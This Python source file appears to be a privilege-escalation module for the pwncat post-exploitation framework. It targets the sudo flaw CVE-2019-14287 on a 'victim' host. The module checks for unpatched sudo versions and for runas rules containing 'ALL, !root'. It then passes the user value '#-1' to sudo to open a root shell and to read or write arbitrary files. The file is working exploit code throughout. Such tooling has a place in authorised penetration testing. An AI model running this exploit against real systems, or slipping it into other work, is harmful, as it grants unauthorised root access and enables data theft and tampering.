#!/usr/bin/env python3
from typing import List
import re

from colorama import Fore, Style
from packaging import version

import pwncat
from pwncat import util
from pwncat.file import RemoteBinaryPipe
from pwncat.gtfobins import Capability, Stream
from pwncat.privesc import BaseMethod, PrivescError, Technique


class Method(BaseMethod):

    name = "cve2019-14287"
    id = "cve2019-14287"
    BINARIES = ["sudo"]

    def enumerate(
        self, progress, task, capability: int = Capability.ALL
    ) -> List[Technique]:
        """ Find all techniques known at this time """

        sudo_fixed_version = '1.8.28'

        try:
            # Check the sudo version number
            sudo_version = pwncat.victim.enumerate.first("system.sudo_version")
        except FileNotFoundError:
            return

        if version.parse(sudo_version.data.version) >= version.parse(sudo_fixed_version):
            # Patched version, no need to even check privs
            return

        rules = []
        for fact in pwncat.victim.enumerate("sudo"):
            progress.update(task, step=str(fact.data))

            # Doesn't appear to be a user specification
            if not fact.data.matched:
                continue

            # The rule appears to match, add it to the list
            rules.append(fact.data)

        for rule in rules:
            for method in pwncat.victim.gtfo.iter_sudo(rule.command, caps=capability):
                userlist = [x.strip() for x in rule.runas_user.split(',')]
                if "ALL" in userlist and "!root" in userlist:
                    # Matches CVE
                    progress.update(task, step=str(rule))
                    yield Technique("root", self, (method, rule), method.cap)

    def execute(self, technique: Technique):
        """ Run the specified technique """

        method, rule = technique.ident

        payload, input_data, exit_command = method.build(
            user="\\#-1", shell=pwncat.victim.shell, spec=rule.command
        )
        try:
            pwncat.victim.sudo(payload, as_is=True, wait=False)
        except PermissionError as exc:
            raise PrivescError(str(exc))

        pwncat.victim.client.send(input_data.encode("utf-8"))

        return exit_command

    def read_file(self, filepath: str, technique: Technique) -> RemoteBinaryPipe:
        method, rule = technique.ident

        payload, input_data, exit_command = method.build(
            user="\\#-1", lfile=filepath, spec=rule.command
        )

        mode = "r"
        if method.stream is Stream.RAW:
            mode += "b"

        try:
            pipe = pwncat.victim.sudo(
                payload,
                as_is=True,
                stream=True,
                mode=mode,
                exit_cmd=exit_command.encode("utf-8"),
            )
        except PermissionError as exc:
            raise PrivescError(str(exc))

        pwncat.victim.client.send(input_data.encode("utf-8"))

        return method.wrap_stream(pipe)

    def write_file(self, filepath: str, data: bytes, technique: Technique):
        method, rule = technique.ident

        payload, input_data, exit_command = method.build(
            user="\\#-1", lfile=filepath, spec=rule.command, length=len(data)
        )

        mode = "w"
        if method.stream is Stream.RAW:
            mode += "b"

        try:
            pipe = pwncat.victim.sudo(
                payload,
                as_is=True,
                stream=True,
                mode=mode,
                exit_cmd=exit_command.encode("utf-8"),
            )
        except PermissionError as exc:
            raise PrivescError(str(exc))

        pwncat.victim.client.send(input_data.encode("utf-8"))

        with method.wrap_stream(pipe) as pipe:
            pipe.write(data)

    def get_name(self, tech: Technique):
        """ Get the name of the given technique for display """
        return f"[cyan]{tech.ident[0].binary_path}[/cyan] ([red]sudo CVE-2019-14287[/red])"
